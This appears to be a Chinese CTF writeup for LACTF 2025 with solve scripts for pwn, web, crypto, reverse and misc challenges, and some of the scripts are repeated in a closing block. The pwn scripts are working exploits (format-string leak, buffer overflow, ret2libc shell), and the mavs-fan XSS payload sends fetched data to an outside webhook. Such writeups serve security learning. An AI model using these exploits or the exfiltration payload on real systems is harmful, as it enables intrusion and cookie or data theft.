# 2025LACTF writeup by Min-Venom

> 原文: https://www.ctfiot.com/227551.html
> ID: 227551

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱

admin@chamd5.org(带上简历和想加入的小组)

Pwn:

2password

from pwn import *
context.log_level = 'debug'

for i in range(6,9):
    p = remote("chall.lac.tf",31142)

    p.sendline(f"%{i}$p")
    p.sendline(b"1")
    p.sendline(b"1")

    p.interactive()

输出结果Hex解码，按小端序转换过来即为flag

lactf{hunter2_cfc0xz68}

state-change

from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
        gdb.attach(p)
        pause()
def s(a):
        p.send(a)
def sa(a,b):
        p.sendafter(a,b)
def sl(a):
        p.sendline(a)
def sla(a,b):
        p.sendlineafter(a,b)
def r(a):
        p.recv(a)
#def pr(a):
        #print(p.recv(a))
def rl(a):
        return p.recvuntil(a)
def inter():
        p.interactive()
def get_addr64():
        return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
        return u32(p.recvuntil("xf7")[-4:])
def get_sb():
        return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
        return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

    
#context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')   

elf=ELF('./pwn')
p=remote('chall.lac.tf',31593)
#p = process('./pwn')
read=0x4012C1
door=0x4011D6
rl("Hey there, I'm deaddead. Who are you?")
payload=b'a'*(0x20)+p64(0x404540+0x20-1)+p64(read)
#bug()
s(payload)
rl("Hey there, I'm deaddead. Who are you?")
payload=p32(0xF1EEEE2D)#b'x2dxeexeexf1'#0x27
pay=p32(0xF1EEEE2D)*9+b'a'*3+p64(door)
s(pay)
inter()       

minceraft

from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
        gdb.attach(p)
        pause()
def s(a):
        p.send(a)
def sa(a,b):
        p.sendafter(a,b)
def sl(a):
        p.sendline(a)
def sla(a,b):
        p.sendlineafter(a,b)
def r(a):
        p.recv(a)
#def pr(a):
        #print(p.recv(a))
def rl(a):
        return p.recvuntil(a)
def inter():
        p.interactive()
def get_addr64():
        return u64(p.recvuntil("x7c")[-6:].ljust(8,b'x00'))
def get_addr32():
        return u32(p.recvuntil("xf7")[-4:])
def get_sb():
        return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
        return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

    
#context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('./libc.so.6')   

elf=ELF('./pwn')
p=remote('chall.lac.tf',31137)
#p = process('./pwn')

rl("2. Multiplayer")
sl(str(1))
rl("Enter world name:")
read=0x40124B
pay=b'x00'*(0x40)+p64(0x404a40)+p64(0x40114D)+p64(0x0000000000401016)+p64(0x401243)
sl(pay)

rl("2. Creative")
sl(str(1))
rl("2. Exit")
#bug()
sl(str(2))
libc_base=get_addr64()-1914720
li(hex(libc_base))
system,bin_sh=get_sb()
rdi = libc_base+libc.search(asm("pop rdinret")).__next__()

payload=p64(rdi)+p64(bin_sh)+p64(system)
payload=payload.ljust(0x40,b'x00')+p64(0x404a00-8)+p64(0x401387)
#bug()
sl(payload)

rl("2. Creative")
sl(str(1))
rl("2. Exit")

sl(str(2))
inter()       

 Web:

lucky-flag

let enc = `"\u000e\u0003\u0001\u0016\u0004\u0019\u0015V\u0011=\u000bU=\u000e\u0017\u0001\t=R\u0010=\u0011\t\u000bSS\u001f"`;
for (let i = 0; i < enc.length; ++i) {
  try {
    enc = JSON.parse(enc);
  } catch (e) { }
}
let rw = [];
for (const e of enc) {
  rw.push(e.charCodeAt(0) ^ 0x62);
}
const flag = rw.map(x => String.fromCharCode(x)).join('');
console.log(`${flag}`);

lactf{w4s_i7_luck_0r_ski11}

I spy…

Stage token：B218B51749AB9E4C669E4B33122C8AE3

A token in the HTML source code： 66E7AEBA46293C88D484CDAB0E479268 

A token in the JavaScript console：5D1F98BCEE51588F6A7500C4DAEF8AD6

A token in the stylesheet：29D3065EFED4A6F82F2116DA1784C265

A token in javascript code：9D34859CA6FC9BB8A57DB4F444CDAE83

A token in a header：BF1E1EAA5C8FDA6D9D0395B6EA075309

A token in a cookie：647E67B4A8F4AA28FAB602151F1707F2

A token where the robots are forbidden from visiting：3FB4C9545A6189DE5DE446D60F82B3AF

A token where Google is told what pages to visit and index：F1C20B637F1B78A1858A3E62B66C3799（/sitemap.xml）

A token received when making a DELETE request to this page：32BFBAEB91EFF980842D9FA19477A42E（curl -X DELETE "https://i-spy.chall.lac.tf"）

A token in a TXT record at i-spy.chall.lac.tf：7227E8A26FC305B891065FE0A1D4B7D4

lactf{1_sp0773d_z_t0k3ns_4v3rywh3r3}

mavs-fan

需要https://协议，可以利用平台 https://webhook.site

response.text()).then(data=>{ fetch('https://webhook.site/32b7496f-5ad9-4441-8cb8-187519e89a41?cookie='+data,{method:'POST',headers:{'Content-Type': 'application/x-www-form-urlencoded'}})})">

lactf{m4yb3_w3_sh0u1d_tr4d3_1uk4_f0r_4d}

 Crypto:

RSAaaS

import gmpy2
import random

def generate_special_prime(e):
    while True:
        # 生成k的范围确保p是64位（2^63 ≤ p < 2^64）
        min_k = (2 ** 63) // e + 1
        max_k = (2 ** 64 - 1 - 1) // e
        k = random.randint(min_k, max_k)
        p = e * k + 1
        if gmpy2.is_prime(p):
            return p

def generate_64bit_prime():
    while True:
        candidate = random.randint(2 ** 63, 2 ** 64 - 1)
        if gmpy2.is_prime(candidate):
            return candidate

        # 生成满足条件的p

e = 65537
p = generate_special_prime(e)
q = generate_64bit_prime()

print(f"p = {p}nq = {q}")
print(f"验证p-1是否被65537整除: {(p - 1) % e == 0}")
print(f"验证q-1是否被65537整除: {(q - 1) % e == 0}")

$ nc chall.lac.tf 31176
Welcome to my RSA as a Service!
Pass me two primes and I'll do the rest for you.
Let's keep the primes at a 64 bit size, please.
Input p: 10529133306935544779
Input q: 11667520860020090809
Oh no! My service! Please don't give us a bad review!
Here, have a complementary flag for your troubles.
lactf{actually_though_whens_the_last_time_someone_checked_for_that}

lactf{actually_though_whens_the_last_time_someone_checked_for_that}

big e

from Crypto.Util.number import long_to_bytes

# 已知的密文、公钥指数和模数
ct_1 = 7003427993343973209633604223157797389179484683813683779456722118278438552981580821629201099609635249903171901413187274301782131604125932440261436398792561279923201353644665062240232628983398769617870021735462687213315384230009597811708620803976743966567909514341685037497925118142192131350408768935124431331080433697691313467918865993755818981120044023483948250730200785386337033076398494691789842346973681951019033860698847693411061368646250415931744527789768875833220281187219666909459057523372182679170829387933194504283746668835390769531217602348382915358689492117524129757929202594190396696326156951763154356777
ct_2 = 2995334251818636287120912468673386461522795145344535560487265325864722413686091982727438605788851631192187299910519824438553287094479216297828199976116043039048528458879462591368580247044838727287694258607151549844079706204392479194688578102781851646467977751150658542264776551648799517340378173131694653270749425410071080383488918100565955153958793977478719703463115004497213753735577027928062856483316183232075922059366731900291340025009516177568909257605255717594938087543899066756942042664781424833498278544829618874970165660669400140113047048269742309745649848573501494088032718459018143817236079173978684104782
e_1 = 49043
e_2 = 60737
n = 9162219874876832806204248523866163938680921861751582550947065673035037752546476053774362284605943422397285024205866696280912237827227700515353007344062472274717294484810421409217463791112287997964358655519896402380272695026012981743782564008035342746214988154836484419372449523768063368280069515180570625408254410932129769708259508451185553774810385066789146531683973766796965747310893648672657945403825359068647151094841570404979930542270681833162424933411724266687320976217446032292107871449464575533610369244978941764470549091443086646932177141081314452355708815370388814214178980532690792441231698974328523197187

# 扩展欧几里得算法
def extended_gcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = extended_gcd(b % a, a)
        return (g, x - (b // a) * y, y)

    # 计算x和y

g, x, y = extended_gcd(e_1, e_2)

# 确保e_1 * x + e_2 * y = 1
assert g == 1

# 恢复明文
pt = pow(ct_1, x, n) * pow(ct_2, y, n) % n

# 将明文转换为字节串
flag = long_to_bytes(pt)
print(flag)

lactf{b1g_3_but_sm4ll_d!!!_part2_since_i_trolled}

bigram-times

傻逼题只能说，题目给出了一个对二元组也就是将flag两两分组然后对分组后的数据进行bigram_multiplicative_shift变换变换很简单，就是找到这两个字符在_characters_ 这张表中的位置，然后计算shift值，通过此值计算新字符的位置，过程不可逆，同时题目给出了两个测试数据也就是hint

not_the_flag = "mCtRNrPw_Ay9mytTR7ZpLJtrflqLS0BLpthi~2LgUY9cii7w"
also_not_the_flag = "PKRcu0l}D823P2R8c~H9DMc{NmxDF{hD3cB~i1Db}kpR77iU"

我们对两个hint也进行bigram_multiplicative_shift变换，发现和我们flag的密文一致，也就是这个变换不是一个单射，即对一个变换后的值有多个和他对应的初始值，我们可以针对两个字符组合得到的结果建表

characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}~_"

def bigram_multiplicative_shift(bigram):
    pos1 = characters.find(bigram[0]) + 1
    pos2 = characters.find(bigram[1]) + 1
    shift = (pos1 * pos2) % 67
    return characters[((pos1 * shift) % 67) - 1] + characters[((pos2 * shift) % 67) - 1]

decryption_table = {}
for c1 in characters:
    for c2 in characters:
        bigram = c1 + c2
        shifted_bigram = bigram_multiplicative_shift(bigram)
        if shifted_bigram not in decryption_table:
            decryption_table[shifted_bigram] = []
        decryption_table[shifted_bigram].append(bigram)

for key, value in decryption_table.items():
    print(f"{key}: {value}")

shifted_flag = "jlT84CKOAhxvdrPQWlWT6cEVD78z5QREBINSsU50FMhv662W"
shifted_bigrams = [shifted_flag[i:i+2] for i in range(0, len(shifted_flag), 2)]

possible_flag_bigrams = []
for sb in shifted_bigrams:
    if sb in decryption_table:
        possible_flag_bigrams.append(decryption_table[sb])
    else:
        possible_flag_bigrams.append([])

for i, options in enumerate(possible_flag_bigrams):
    print(f"Position {i}: {options}")

接下来我们可以得到一个对应两字符密文的初始值表

Position 0: ['la', 'mC', 'PK']
Position 1: ['ct', 'tR', 'Rc']
Position 2: ['f{', 'u0', 'Nr']
Position 3: ['l}', 'mU', 'Pw']
Position 4: ['D8', 'LT', '_A']
Position 5: ['y9', '1p', '23']
Position 6: ['l1', 'my', 'P2']
Position 7: ['cA', 'tT', 'R8']
Position 8: ['c~', 'ti', 'R7']
Position 9: ['H9', 'V3', 'Zp']
Position 10: ['DM', 'LJ', '_6']
Position 11: ['c{', 'tr', 'R0']
Position 12: ['fl', 'uP', 'Nm']
Position 13: ['qL', 'xD', 'z_']
Position 14: ['F{', 'S0', '4r']
Position 15: ['hD', 'BL', 'E_']
Position 16: ['pt', '3c', '9R']
Position 17: ['hi', 'B~', 'E7']
Position 18: ['i1', '7y', '~2']
Position 19: ['Db', 'Lg', '_5']
Position 20: ['we', 'UY', '}k']
Position 21: ['pR', '3t', '9c']
Position 22: ['ii', '77', '~~']
Position 23: ['iU', '7w', '~}']

是真的傻逼这个题，猜测_分隔，利用https://www.englishcn.com /tools/Leet.htm将带数字的字符串转换成英文看出第一个是multiplicative这个单词也就是mULT1pl1cAtiV3，第二个是groups对应6R0uPz，are对应4rE，pretty对应

9RE77y，最后是sweet对应5we3t之后就能确定了

lactf{mULT1pl1cAtiV3_6R0uPz_4rE_9RE77y_5we3t~~~}

quickprime

solve_mod解方程

exp

from tqdm import *

a=11757726666370053782817548198302445388809746389939427980645854709670708265483115672483931306046568514261486190552321796104493966732964851930344913717167921
b=9316298142245085995566757124471149658002018003251252600095918734996897003201990424167404855208977317145296561668719706133104910348620855338447494773478465
m=13407807929942597099574024998205846127479365820592393377723561443721764030073546976801874298166903427690031858186486050853753882811946569946433649006084096
n=19809648527679995574985995026214252120386158830630072542561625799084852268
7510793014836264680271569767389413084361046266900572117587022842913739505595
3462247114843515996904953953828387946359219361647098255311199845519533103532
0254710579129937002432431484084310356888812572566647322032990377403035619896
27199
ct=6975846772214440771650889063905864655604106205903230208767950559334225200
6616796196678647798051285829585305453898317263980982530435219217936298342814
6286368423607563039009298638233518366607129701361559117341625729444190401836
3356471628503836903765515541133142500182490674733337653802095690320323094222
82324

S = 0
for k in trange(1, 2**15):
    A = int(pow(a, k, m))
    S += int(pow(a, k-1, m))
    B = S * b
    x = var('x')
    f = A * x**2 + B * x - n
    sol = solve_mod(f, m)
    if len(sol) > 0:
        for s in sol:
            if n % int(s[0]) == 0:
                p = int(s[0])
                q = n // p
                break

from Crypto.Util.number import *
p = 310180443514600074553153588766205730602580216449682597076277430107570143045263763584355152481873753139915964457263617871639390456137640662349248114935603
q = 6386491779823495872266601837882790082742583093682566580830239466693364425397460872366805037313069394140075679106680750944711768870975155891667452968264133
ct = 697584677221444077165088906390586465560410620590323020876795055933422520066167961966786477980512858295853054538983172639809825304352192179362983428146286368423607563039009298638233518366607129701361559117341625729444190401836335647162850383690376551554113314250018249067473333765380209569032032309422282324
print(long_to_bytes(pow(ct,inverse(65537,(p-1)*(q-1)),p*q)))

b'lactf{w41t_th1s_1snt_s3cur3_4t_4ll_???}'

Extremely Convenient Breaker

from Crypto.Util.number import *
from pwn import *

context.log_level = 'debug'
sh = remote('chall.lac.tf',31180)
sh.recvuntil(b"Here's the encrypted flag in hex: n")
flag_enc = sh.recvuntil(b"n")
sh.recvuntil(b'What ciphertext do you want me to break in an extremely convenient manner? Enter as hex: ')
k = flag_enc[:
112]+hex(bytes_to_long(b'a'*8))[2:].encode()
k1 = hex(bytes_to_long(b'a'*8))[2:].encode()+flag_enc[-113:-1]
# print(len(flag_enc))
# print(bytes.fromhex(flag_enc.decode()))
# print(len(k))
sh.sendline(k)
sh.recvuntil(b'What ciphertext do you want me to break in an extremely convenient manner? Enter as hex: ')
sh.sendline(k1)
sh.recv()

# b"b'lactf{seems_it_was_extremely_convenient_to_get_t\xf4\xbd\x17\x97#\x8cW\xfei\xbf\xe17/iB.'n"
# b"b'`b\x0e2\x1d\xdf\x813\xe1\xaf\xce\x92%\x0ft$as_extremely_convenient_to_get_the_flag_too_heh}'n"
# lactf{seems_it_was_extremely_convenient_to_get_the_flag_too_heh}

 Reverse:

javascryption

import base64
import urllib.parse

target = "JTNEJTNEUWZsSlglNUJPTERfREFUQSU1RG85MWNzeFdZMzlWZXNwbmVwSjMlNUJPTERfREFUQSU1RGY5bWI3JTVCT0xEX0RBVEElNURHZGpGR2I="

step4 = base64.b64decode(target).decode()
step3 = urllib.parse.unquote(step4)
step2 = step3.replace("[OLD_DATA]", "Z")
step1 = step2[::-1]

flag = base64.b64decode(step1).decode()
print(flag)

lactf{no_grizzly_walls_here}

patricks-paraflag

target = "l_alcotsft{_tihne__ifnlfaign_igtoyt}"

length = len(target)
half = length // 2

s = [""] * length

for i in range(half):
    s[i] = target[2 * i]
    s[half + i] = target[2 * i + 1]

flag = "".join(s)
print(flag)

lactf{the_flag_got_lost_in_infinity}

nine-solves

def valid(char, target_steps):
    bit_check = 0
    val = char

    while val != 1 and bit_check < target_steps:
        if val % 2 == 0:
            val //= 2
        else:
            val = 3 * val + 1
        bit_check += 1

    return bit_check == target_steps and val == 1

def solve(yi):
    input_chars = []

    for target_steps in yi:
        for char in range(32, 127):
            if valid(char, target_steps):
                input_chars.append(chr(char))
                break

    return "".join(input_chars)

yi = [27, 38, 87, 95, 118, 9]

input = solve(yi)

print(f"{input}")

netcat输入得到flag：

lactf{the_only_valid_solution_is_BigyaP}

the-eye

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

void unshuffle(char *a1, int *rand_values) {
    int v3;
    unsigned char v2;
    int len = strlen(a1);
    for (int i = 0; i < len; ++i) {
        v3 = rand_values[len - 1 - i];
        v2 = a1[i];
        a1[i] = a1[v3];
        a1[v3] = v2;
    }
}

void decrypt(int currtime, FILE *output_file) {
    unsigned int v3;
    unsigned int v4;
    int i;
    v3 = currtime;
    v4 = v3;
    srand(v3);
    char s[] = {101,121,97,114,109,115,105,110,105,111,109,116,114,32,32,105,105,101,46,104,101,112,116,104,87,32,95,101,115,111,105,110,97,100,115,97,101,99,32,111,116,101,116,44,114,101,69,32,111,105,105,115,103,111,110,32,116,103,103,114,101,99,100,109,97,32,104,32,100,121,112,105,116,99,117,32,97,32,116,111,110,117,32,115,101,111,32,95,111,116,114,32,97,99,105,103,105,32,32,104,108,110,116,98,32,32,46,101,101,32,110,115,116,32,103,101,110,32,105,100,100,101,44,119,108,114,32,101,114,116,114,100,99,44,116,101,115,101,104,32,32,97,115,32,105,105,46,110,44,105,97,32,97,120,117,104,112,105,121,97,110,110,97,114,114,121,116,117,116,101,115,112,104,32,32,101,99,115,108,32,115,101,115,103,105,110,111,108,45,32,111,99,117,101,119,109,116,32,32,115,32,115,32,32,111,97,121,101,100,105,32,101,105,32,111,59,103,97,123,121,115,32,97,103,105,110,110,102,116,105,109,100,111,45,97,103,111,99,101,32,109,87,116,101,111,100,100,32,111,112,105,32,103,114,111,115,111,101,32,118,104,104,116,116,32,95,116,112,111,115,32,72,32,105,72,32,100,101,97,32,116,97,99,112,32,115,32,101,108,104,111,97,97,115,114,101,116,116,101,32,112,108,105,101,116,116,101,108,102,101,110,110,108,104,114,101,114,101,101,99,101,99,115,32,101,115,32,109,101,100,105,116,114,114,97,110,116,110,104,108,32,116,101,114,101,101,116,116,111,111,115,95,110,32,111,111,32,108,32,32,32,97,116,97,99,115,101,118,32,109,116,110,32,97,32,108,50,97,101,116,101,110,121,32,32,112,111,69,117,101,101,110,32,101,114,32,95,32,109,101,116,116,101,114,108,101,114,32,102,99,116,97,104,101,116,114,121,104,104,112,97,101,101,102,105,104,121,108,114,44,101,32,109,32,101,97,101,101,104,104,32,114,100,32,97,110,101,32,109,32,110,103,110,121,97,114,97,116,116,116,97,100,110,32,111,114,119,117,111,104,125,104,110,110,110,110,115,32,101,101,32,97,105,116,100,97,32,97,32,116,103,32,101,102,110,97,32,115,32,118,32,114,116,115,116,32,114,78,50,100,100,32,105,104,116,120,46,105,95,97,101,100,108,118,32,105,111,104,103,116,32,108,32,117,84,115,108,101,97,110,79,109,99,97,108,115,105,105,99,110,111,104,116,103,100,116,110,101,97,112,32,101,97,117,108,114,32,97,95,118,109,117,97,105,108,101,110,97,104,109,115,117,110,101,32,104,101,32,44,115,100,116,115,117,101,101,101,32,32,32,115,110,104,97,108,116,101,104,32,121,105,101,117,101,115,115,112,101,116,115,97,101,102,44,120,120,114,32,110,116,108,121,108,100,101,100,32,101,109,117,101,32,115,101,97,111,32,101,105,116,101,97,32,112,101,110,65,100,63,97,112,108,115,104,112,114,101,32,114,102,32,32,116,100,120,115,98,97,110,32,32,103,104,32,32,110,110,116,97,101,118,115,105,32,111,101,97,108,99,110,115,115,115,112,114,115,99,108,101,101,121,115,115,99,32,115,115,114,116,115,111,101,105,97,116,102,119,110};
    srand(v3);
    int rand_values[728 * 23];
    int index = 0;
    for (i = 0; i <= 21; ++i) {
        for (int j = strlen(s) - 1; j >= 0; --j) {
            rand_values[index++] = rand() % (j + 1);
        }
    }
    for (i = 21; i >= 0; --i) {
        unshuffle(s, rand_values + i * strlen(s));
    }

    fprintf(output_file, "%sn", s);
}

int main() {
    printf("%dn", time(0LL));
    int i = 1739013510;
    int j = 1739013517;
    FILE *output_file = fopen("./decrypted.txt", "a");
    if (!output_file) {
        perror("Failed to open decrypted.txt");
        return 1;
    }
    while (i < j) {
        decrypt(i, output_file);
        i++;
    }
    fclose(output_file);
    return 0;
}

在Linux下运行代码打开decrypted.txt，搜索lactf得到flag

lactf{are_you_ready_to_learn_what_comes_next?}

 Misc:

extended

def solve(extended_flag):
    original_flag = ""
    for c in extended_flag:
        o = bin(ord(c))[2:].zfill(8)

        for i in range(8):
            if o[i] == "1":
                o = o[:i] + "0" + o[i + 1:]
                break

        original_flag += chr(int(o, 2))

    return original_flag

with open("chall.txt", "rb") as f:
    extended_flag = f.read().decode("iso8859-1")

flag = solve(extended_flag)
print(flag)

lactf{Funnily_Enough_This_Looks_Different_On_Mac_And_Windows}

welcome:

rules**

lactf{my_entire_team_agrees_to_follow_the_rules}

discord**

lactf{i_l0v3_3d1t1ng_my_d1sc0rd_msgs}

结束

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
from pwn import *
context.log_level = 'debug'

for i in range(6,9):
    p = remote("chall.lac.tf",31142)

    p.sendline(f"%{i}$p")
    p.sendline(b"1")
    p.sendline(b"1")

    p.interactive()
from pwn import*
from struct import pack
import ctypes
    #from LibcSearcher import *
from ae64 import AE64
def bug():
        gdb.attach(p)
        pause()
def s(a):
        p.send(a)
def sa(a,b):
        p.sendafter(a,b)
def sl(a):
        p.sendline(a)
def sla(a,b):
        p.sendlineafter(a,b)
def r(a):
        p.recv(a)
    #def pr(a):
        #print(p.recv(a))
def rl(a):
        return p.recvuntil(a)
def inter():
        p.interactive()
def get_addr64():
        return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
        return u32(p.recvuntil("xf7")[-4:])
def get_sb():
        return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
        return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

    
    #context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')   

elf=ELF('./pwn')
p=remote('chall.lac.tf',31593)
    #p = process('./pwn')
read=0x4012C1
door=0x4011D6
rl("Hey there, I'm deaddead. Who are you?")
payload=b'a'*(0x20)+p64(0x404540+0x20-1)+p64(read)
    #bug()
s(payload)
rl("Hey there, I'm deaddead. Who are you?")
payload=p32(0xF1EEEE2D)#b'x2dxeexeexf1'#0x27
pay=p32(0xF1EEEE2D)*9+b'a'*3+p64(door)
s(pay)
inter()
from pwn import*
from struct import pack
import ctypes
    #from LibcSearcher import *
from ae64 import AE64
def bug():
        gdb.attach(p)
        pause()
def s(a):
        p.send(a)
def sa(a,b):
        p.sendafter(a,b)
def sl(a):
        p.sendline(a)
def sla(a,b):
        p.sendlineafter(a,b)
def r(a):
        p.recv(a)
    #def pr(a):
        #print(p.recv(a))
def rl(a):
        return p.recvuntil(a)
def inter():
        p.interactive()
def get_addr64():
        return u64(p.recvuntil("x7c")[-6:].ljust(8,b'x00'))
def get_addr32():
        return u32(p.recvuntil("xf7")[-4:])
def get_sb():
        return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
        return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

    
    #context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('./libc.so.6')   

elf=ELF('./pwn')
p=remote('chall.lac.tf',31137)
    #p = process('./pwn')

rl("2. Multiplayer")
sl(str(1))
rl("Enter world name:")
read=0x40124B
pay=b'x00'*(0x40)+p64(0x404a40)+p64(0x40114D)+p64(0x0000000000401016)+p64(0x401243)
sl(pay)

rl("2. Creative")
sl(str(1))
rl("2. Exit")
    #bug()
sl(str(2))
libc_base=get_addr64()-1914720
li(hex(libc_base))
system,bin_sh=get_sb()
rdi = libc_base+libc.search(asm("pop rdinret")).__next__()

payload=p64(rdi)+p64(bin_sh)+p64(system)
payload=payload.ljust(0x40,b'x00')+p64(0x404a00-8)+p64(0x401387)
    #bug()
sl(payload)

rl("2. Creative")
sl(str(1))
rl("2. Exit")

sl(str(2))
inter()
let enc = `"\u000e\u0003\u0001\u0016\u0004\u0019\u0015V\u0011=\u000bU=\u000e\u0017\u0001\t=R\u0010=\u0011\t\u000bSS\u001f"`;
for (let i = 0; i < enc.length; ++i) {
  try {
    enc = JSON.parse(enc);
  } catch (e) { }
}
let rw = [];
for (const e of enc) {
  rw.push(e.charCodeAt(0) ^ 0x62);
}
const flag = rw.map(x => String.fromCharCode(x)).join('');
console.log(`${flag}`);
Stage token：B218B51749AB9E4C669E4B33122C8AE3

A token in the HTML source code： 66E7AEBA46293C88D484CDAB0E479268 

A token in the JavaScript console：5D1F98BCEE51588F6A7500C4DAEF8AD6

A token in the stylesheet：29D3065EFED4A6F82F2116DA1784C265

A token in javascript code：9D34859CA6FC9BB8A57DB4F444CDAE83

A token in a header：BF1E1EAA5C8FDA6D9D0395B6EA075309

A token in a cookie：647E67B4A8F4AA28FAB602151F1707F2

A token where the robots are forbidden from visiting：3FB4C9545A6189DE5DE446D60F82B3AF

A token where Google is told what pages to visit and index：F1C20B637F1B78A1858A3E62B66C3799（/sitemap.xml）

A token received when making a DELETE request to this page：32BFBAEB91EFF980842D9FA19477A42E（curl -X DELETE "https://i-spy.chall.lac.tf"）

A token in a TXT record at i-spy.chall.lac.tf：7227E8A26FC305B891065FE0A1D4B7D4
response.text()).then(data=>{ fetch('https://webhook.site/32b7496f-5ad9-4441-8cb8-187519e89a41?cookie='+data,{method:'POST',headers:{'Content-Type': 'application/x-www-form-urlencoded'}})})">
import gmpy2
import random

def generate_special_prime(e):
    while True:
        # 生成k的范围确保p是64位（2^63 ≤ p < 2^64）
        min_k = (2 ** 63) // e + 1
        max_k = (2 ** 64 - 1 - 1) // e
        k = random.randint(min_k, max_k)
        p = e * k + 1
        if gmpy2.is_prime(p):
            return p

def generate_64bit_prime():
    while True:
        candidate = random.randint(2 ** 63, 2 ** 64 - 1)
        if gmpy2.is_prime(candidate):
            return candidate

        # 生成满足条件的p

e = 65537
p = generate_special_prime(e)
q = generate_64bit_prime()

print(f"p = {p}nq = {q}")
print(f"验证p-1是否被65537整除: {(p - 1) % e == 0}")
print(f"验证q-1是否被65537整除: {(q - 1) % e == 0}")

$ nc chall.lac.tf 31176
Welcome to my RSA as a Service!
Pass me two primes and I'll do the rest for you.
Let's keep the primes at a 64 bit size, please.
Input p: 10529133306935544779
Input q: 11667520860020090809
Oh no! My service! Please don't give us a bad review!
Here, have a complementary flag for your troubles.
lactf{actually_though_whens_the_last_time_someone_checked_for_that}
from Crypto.Util.number import long_to_bytes

# 已知的密文、公钥指数和模数
ct_1 = 7003427993343973209633604223157797389179484683813683779456722118278438552981580821629201099609635249903171901413187274301782131604125932440261436398792561279923201353644665062240232628983398769617870021735462687213315384230009597811708620803976743966567909514341685037497925118142192131350408768935124431331080433697691313467918865993755818981120044023483948250730200785386337033076398494691789842346973681951019033860698847693411061368646250415931744527789768875833220281187219666909459057523372182679170829387933194504283746668835390769531217602348382915358689492117524129757929202594190396696326156951763154356777
ct_2 = 2995334251818636287120912468673386461522795145344535560487265325864722413686091982727438605788851631192187299910519824438553287094479216297828199976116043039048528458879462591368580247044838727287694258607151549844079706204392479194688578102781851646467977751150658542264776551648799517340378173131694653270749425410071080383488918100565955153958793977478719703463115004497213753735577027928062856483316183232075922059366731900291340025009516177568909257605255717594938087543899066756942042664781424833498278544829618874970165660669400140113047048269742309745649848573501494088032718459018143817236079173978684104782
e_1 = 49043
e_2 = 60737
n = 9162219874876832806204248523866163938680921861751582550947065673035037752546476053774362284605943422397285024205866696280912237827227700515353007344062472274717294484810421409217463791112287997964358655519896402380272695026012981743782564008035342746214988154836484419372449523768063368280069515180570625408254410932129769708259508451185553774810385066789146531683973766796965747310893648672657945403825359068647151094841570404979930542270681833162424933411724266687320976217446032292107871449464575533610369244978941764470549091443086646932177141081314452355708815370388814214178980532690792441231698974328523197187

# 扩展欧几里得算法
def extended_gcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = extended_gcd(b % a, a)
        return (g, x - (b // a) * y, y)

    # 计算x和y

g, x, y = extended_gcd(e_1, e_2)

# 确保e_1 * x + e_2 * y = 1
assert g == 1

# 恢复明文
pt = pow(ct_1, x, n) * pow(ct_2, y, n) % n

# 将明文转换为字节串
flag = long_to_bytes(pt)
print(flag)
not_the_flag = "mCtRNrPw_Ay9mytTR7ZpLJtrflqLS0BLpthi~2LgUY9cii7w"
also_not_the_flag = "PKRcu0l}D823P2R8c~H9DMc{NmxDF{hD3cB~i1Db}kpR77iU"
characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}~_"

def bigram_multiplicative_shift(bigram):
    pos1 = characters.find(bigram[0]) + 1
    pos2 = characters.find(bigram[1]) + 1
    shift = (pos1 * pos2) % 67
    return characters[((pos1 * shift) % 67) - 1] + characters[((pos2 * shift) % 67) - 1]

decryption_table = {}
for c1 in characters:
    for c2 in characters:
        bigram = c1 + c2
        shifted_bigram = bigram_multiplicative_shift(bigram)
        if shifted_bigram not in decryption_table:
            decryption_table[shifted_bigram] = []
        decryption_table[shifted_bigram].append(bigram)

for key, value in decryption_table.items():
    print(f"{key}: {value}")

shifted_flag = "jlT84CKOAhxvdrPQWlWT6cEVD78z5QREBINSsU50FMhv662W"
shifted_bigrams = [shifted_flag[i:i+2] for i in range(0, len(shifted_flag), 2)]

possible_flag_bigrams = []
for sb in shifted_bigrams:
    if sb in decryption_table:
        possible_flag_bigrams.append(decryption_table[sb])
    else:
        possible_flag_bigrams.append([])

